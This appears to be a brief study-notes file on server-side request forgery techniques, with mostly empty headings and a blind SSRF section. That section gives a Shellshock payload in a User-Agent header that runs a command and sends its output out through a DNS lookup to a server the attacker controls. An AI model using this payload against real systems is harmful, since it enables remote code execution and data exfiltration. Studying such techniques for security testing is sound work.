### Localhost as the target url

### Some private (internal) IP address as the target url
See private_ip.py

### SSRF with blacklist-based input filter

### SSRF with whitelist-based input filters

### Open redirection

### Blind SSRF
- e.g. check Referer header, you can try to paste a url of your own server and see if it makes requests to it... 
- try shellshock attack (which allows remote code execution)
    - e.g. if with the User-Agent header: `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).domain-of-the-server-that-you-control`
    And of course change Referer to some internal server e.g.: http://192.168.0.1:8080

